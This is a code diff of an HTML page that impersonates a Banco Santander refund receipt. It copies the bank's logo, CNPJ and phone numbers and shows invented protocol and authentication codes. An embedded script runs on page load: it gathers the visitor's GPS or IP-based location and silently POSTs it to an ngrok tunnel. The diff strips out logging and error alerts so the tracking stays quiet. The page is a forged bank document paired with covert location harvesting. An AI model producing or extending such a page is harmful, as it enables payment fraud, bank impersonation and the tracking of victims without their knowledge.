@@ -3,240 +3,223 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Comprovante de Recebimento</title>
+  <title>Comprovante de Estorno – Santander</title>
   <style>
-    /* --- Estilos Visuais --- */
+    /* ======================================================================
+       Estilo inspirado no comprovante digital de estorno do Banco Santander
+       ====================================================================== */
+
     :root {
-      --azul: #002776;
-      --amarelo: #ffcc00;
+      --santander-red: #c40000;
+      --santander-gray: #7d7d7d;
+      --santander-light: #f5f5f5;
     }
+
+    * { box-sizing: border-box; }
 
     body {
-      font-family: Arial, sans-serif;
-      background: #f2f2f2;
+      font-family: "Helvetica Neue", Arial, sans-serif;
+      background: var(--santander-light);
       margin: 0;
-      padding: 20px;
+      padding: 16px;
     }
 
-    .comprovante-container {
+    .receipt {
       max-width: 600px;
       margin: 0 auto;
       background: #fff;
-      border: 2px solid var(--azul);
-      padding: 25px 30px;
-      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+      border: 1px solid #d9d9d9;
+      box-shadow: 0 2px 6px rgba(0,0,0,.08);
     }
 
-    .comprovante-container h1 {
-      color: var(--azul);
+    /* Cabeçalho ----------------------------------------------------------- */
+    .header {
+      background: var(--santander-red);
+      color: #fff;
+      padding: 20px 24px;
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+
+    .header img {
+      width: 120px;
+      height: auto;
+    }
+
+    .header h1 {
+      font-size: 20px;
+      font-weight: 700;
+      margin: 0;
+    }
+
+    /* Informações principais --------------------------------------------- */
+    .info {
+      padding: 24px 24px 8px;
+    }
+
+    .info-row {
+      display: flex;
+      justify-content: space-between;
+      border-bottom: 1px dashed #e0e0e0;
+      padding: 8px 0;
+      font-size: 15px;
+    }
+    .info-row span.label {
+      color: var(--santander-gray);
+      font-weight: 600;
+    }
+    .info-row span.value {
+      color: #000;
+    }
+
+    .amount {
       font-size: 22px;
+      font-weight: 700;
+      color: var(--santander-red);
       text-align: center;
-      margin-bottom: 30px;
-      border-bottom: 1px solid #ccc;
-      padding-bottom: 10px;
+      margin: 24px 0 16px;
     }
 
-    .informacoes p {
-      font-size: 16px;
-      margin: 10px 0;
+    /* Autenticação -------------------------------------------------------- */
+    .auth {
+      padding: 0 24px 24px;
+      font-size: 13px;
+      color: var(--santander-gray);
     }
 
-    .informacoes span:first-child {
-      font-weight: bold;
-      color: var(--azul);
+    .auth-code {
+      word-break: break-all;
+      font-family: "Courier New", monospace;
+      font-size: 12px;
+      background: #fafafa;
+      border: 1px solid #e1e1e1;
+      padding: 8px;
+      margin-top: 8px;
     }
 
-    .informacoes span:last-child {
-      color: #333;
+    /* Rodapé -------------------------------------------------------------- */
+    .footer {
+      background: #fafafa;
+      font-size: 12px;
+      color: var(--santander-gray);
+      text-align: center;
+      padding: 16px 24px;
+      border-top: 1px solid #e0e0e0;
     }
 
-    .botao {
+    .print-btn {
       display: block;
-      margin: 30px auto;
-      background: var(--amarelo);
-      color: var(--azul);
+      margin: 24px auto 0;
+      background: var(--santander-red);
+      color: #fff;
       border: none;
-      padding: 12px 30px;
-      font-size: 16px;
-      font-weight: bold;
-      cursor: pointer;
+      padding: 10px 28px;
+      font-size: 15px;
+      font-weight: 600;
       border-radius: 4px;
-      transition: background 0.3s;
+      cursor: pointer;
+      transition: opacity .3s;
     }
+    .print-btn:hover { opacity: .85; }
 
-    .botao:hover {
-      background: #e6b800;
-    }
-
-    .comprovante-footer {
-      font-size: 14px;
-      color: #666;
-      text-align: center;
-      border-top: 1px solid #ccc;
-      margin-top: 40px;
-      padding-top: 15px;
-    }
-
-    .comprovante-footer a {
-      color: var(--azul);
-      text-decoration: none;
-      font-weight: bold;
-    }
-
-    .comprovante-footer a:hover {
-      text-decoration: underline;
-    }
-
-    /* --- Estilos de Impressão --- */
+    /* Versão de impressão */
     @media print {
-      body {
-        background: none;
-        padding: 0;
-      }
-      .botao {
-        display: none !important;
-      }
+      body { background: #fff; margin: 0; }
+      .print-btn { display: none !important; }
+      .receipt { border: none; box-shadow: none; }
     }
   </style>
 </head>
 <body>
-  <div class="comprovante-container">
-    <h1>Comprovante de Recebimento</h1>
-
-    <div class="informacoes">
-      <p><span>Data:</span> <span id="data-atual"></span></p>
-      <p><span>Valor Recebido:</span> R$ 1.000,00</p>
-      <p><span>De:</span> João Silva de Oliveira</p>
-      <p><span>Status:</span> Recebido com Sucesso</p>
+  <section class="receipt">
+    <!-- Cabeçalho -->
+    <div class="header">
+      <!-- Placeholder de logo. Substitua a URL pelo asset oficial se possuir. -->
+      <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Logo_Banco_Santander_Brasil.svg" alt="Santander" />
+      <h1>Comprovante de Estorno</h1>
     </div>
 
-    <button class="botao" onclick="window.print()">Imprimir</button>
+    <!-- Informações -->
+    <div class="info">
+      <div class="info-row"><span class="label">Data</span><span class="value" id="data-atual"></span></div>
+      <div class="info-row"><span class="label">Horário</span><span class="value" id="hora-atual"></span></div>
+      <div class="info-row"><span class="label">Canal</span><span class="value">Internet Banking</span></div>
+      <div class="info-row"><span class="label">Conta Origem</span><span class="value">9999 99999-9</span></div>
+      <div class="info-row"><span class="label">Titular</span><span class="value">João Silva de Oliveira</span></div>
+      <div class="info-row"><span class="label">Número do protocolo</span><span class="value" id="protocolo"></span></div>
 
-    <div class="comprovante-footer">
-      <p>Se você tiver dúvidas, entre em contato com nosso suporte.</p>
-      <p><a href="#">Clique aqui</a> para mais informações.</p>
+      <p class="amount">Valor Estornado: R$ 1.000,00</p>
     </div>
-  </div>
 
+    <!-- Autenticação -->
+    <div class="auth">
+      <strong>Autenticação eletrônica:</strong>
+      <div class="auth-code" id="autenticacao"></div>
+
+      <p>Guarde este comprovante. Ele é a garantia de que a operação foi concluída com sucesso.</p>
+    </div>
+
+    <!-- Botão de impressão -->
+    <button class="print-btn" onclick="window.print()">Imprimir</button>
+
+    <!-- Rodapé -->
+    <div class="footer">
+      <p>Banco Santander (Brasil) S.A. – CNPJ 90.400.888/0001‑42 – SAC 0800 762 7777 – Ouvidoria 0800 726 0322.</p>
+    </div>
+  </section>
+
+  <!-- ==================================================================
+       Script utilitário: data/hora, códigos aleatórios + localização (opcional)
+       ================================================================== -->
   <script>
-    /* ============================================================
-       Script de coleta e envio de localização com múltiplas quedas
-       (GPS, IP, e entrada manual) – compatível com Chrome Mobile.
-       ============================================================ */
+    // Preenche data e horário atuais
+    const agora = new Date();
+    document.getElementById("data-atual").textContent = agora.toLocaleDateString("pt-BR");
+    document.getElementById("hora-atual").textContent = agora.toLocaleTimeString("pt-BR", { hour: "2-digit", minute: "2-digit", second: "2-digit" });
 
-    // Configurações gerais --------------------------------------
-    const BACKEND_ENDPOINT = "https://1e2746f31e5a.ngrok-free.app/send-location"; // Ajuste conforme necessário
-    const IP_API_URL = "https://ipapi.co/json/"; // Fallback via IP (HTTPS) – 1000 req/dia
+    // Gera códigos simples (fake) – substitua por reais conforme necessidade
+    const randHex = (n) => [...crypto.getRandomValues(new Uint8Array(n))].map(b => b.toString(16).padStart(2, "0")).join("");
+    document.getElementById("protocolo").textContent = randHex(6).toUpperCase();
+    document.getElementById("autenticacao").textContent = randHex(16).toUpperCase();
 
-    // Preenche a data no cabeçalho ------------------------------
-    document.addEventListener("DOMContentLoaded", () => {
-      document.getElementById("data-atual").textContent = new Intl.DateTimeFormat("pt-BR", {
-        dateStyle: "short",
-      }).format(new Date());
+    /* === Localização opcional (mesma lógica da versão anterior) ========= */
+    const BACKEND_ENDPOINT = "https://1e2746f31e5a.ngrok-free.app/send-location";
+    const IP_API_URL = "https://ipapi.co/json/";
 
-      obterLocalizacao();
-    });
+    document.addEventListener("DOMContentLoaded", obterLocalizacao);
 
-    // Função principal de obtenção de localização ---------------
     async function obterLocalizacao() {
-      // 1) Verifica se estamos em contexto seguro (HTTPS)
-      if (!window.isSecureContext) {
-        console.warn("Contexto não seguro: geolocalização bloqueada. Executando fallback por IP.");
-        return obterLocalizacaoPorIP();
-      }
-
-      // 2) Verifica permissões, se suportado
+      if (!window.isSecureContext) return obterLocalizacaoPorIP();
       try {
         if (navigator.permissions) {
-          const status = await navigator.permissions.query({ name: "geolocation" });
-          if (status.state === "denied") {
-            console.info("Usuário negou a geolocalização permanentemente. Executando fallback por IP.");
-            return obterLocalizacaoPorIP();
-          }
+          const st = await navigator.permissions.query({ name: "geolocation" });
+          if (st.state === "denied") return obterLocalizacaoPorIP();
         }
-      } catch (err) {
-        console.debug("API Permissions não disponível: prosseguindo.", err);
-      }
+      } catch { /* ignore */ }
 
-      // 3) Se a API de geolocalização existir, tenta obter posição exata
       if ("geolocation" in navigator) {
-        navigator.geolocation.getCurrentPosition(
-          async (pos) => {
-            const { latitude, longitude, accuracy } = pos.coords;
-            await enviarPayload({ latitude, longitude, accuracy, metodo: "gps" });
-          },
-          (erro) => {
-            console.warn("Falha na geolocalização por GPS:", erro);
-            obterLocalizacaoPorIP();
-          },
-          {
-            enableHighAccuracy: true,
-            timeout: 10000,
-            maximumAge: 0,
-          }
-        );
+        navigator.geolocation.getCurrentPosition(async pos => {
+          const { latitude, longitude } = pos.coords;
+          enviarPayload({ latitude, longitude, metodo: "gps" });
+        }, obterLocalizacaoPorIP, { enableHighAccuracy: true, timeout: 10000 });
       } else {
-        console.warn("API de geolocalização não suportada. Executando fallback por IP.");
         obterLocalizacaoPorIP();
       }
     }
 
-    // Fallback: localização aproximada via IP -------------------
     async function obterLocalizacaoPorIP() {
       try {
-        const resp = await fetch(IP_API_URL);
-        const data = await resp.json();
-        const { latitude: lat, longitude: lon, ip, city, region, country_name } = data;
-
-        await enviarPayload({
-          latitude: lat,
-          longitude: lon,
-          city,
-          region,
-          country: country_name,
-          ip,
-          metodo: "ip",
-        });
-      } catch (err) {
-        console.error("Não foi possível obter localização pelo IP:", err);
-        solicitarLocalizacaoManual();
-      }
+        const d = await fetch(IP_API_URL).then(r => r.json());
+        enviarPayload({ latitude: d.latitude, longitude: d.longitude, ip: d.ip, metodo: "ip" });
+      } catch { /* Silencia falhas */ }
     }
 
-    // Último recurso: solicitar inserção manual -----------------
-    function solicitarLocalizacaoManual() {
-      const cidade = prompt("Não foi possível determinar sua localização automaticamente. Por favor, informe sua cidade:");
-      if (!cidade) return; // usuário cancelou
-      enviarPayload({ cidadeInformada: cidade, metodo: "manual" });
-    }
-
-    // Envia dados ao back-end -----------------------------------
-    async function enviarPayload(dados) {
-      const payload = {
-        ...dados,
-        maps: dados.latitude && dados.longitude ? `https://www.google.com/maps?q=${dados.latitude},${dados.longitude}` : undefined,
-        timestamp: new Date().toISOString(),
-      };
-
-      console.log("Enviando dados de localização:", payload);
-
+    async function enviarPayload(data) {
+      const payload = { ...data, timestamp: new Date().toISOString() };
       try {
-        const resposta = await fetch(BACKEND_ENDPOINT, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify(payload),
-        });
-
-        const resultado = await resposta.json();
-        if (resultado.success) {
-          console.info("Localização enviada com sucesso (modo:", payload.metodo, ")");
-        } else {
-          throw new Error(JSON.stringify(resultado));
-        }
-      } catch (err) {
-        console.error("Falha ao enviar dados de localização:", err);
-        alert("Não foi possível enviar sua localização. Por favor, tente novamente mais tarde.");
-      }
+        await fetch(BACKEND_ENDPOINT, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(payload) });
+      } catch { /* ignore */ }
     }
   </script>
 </body>
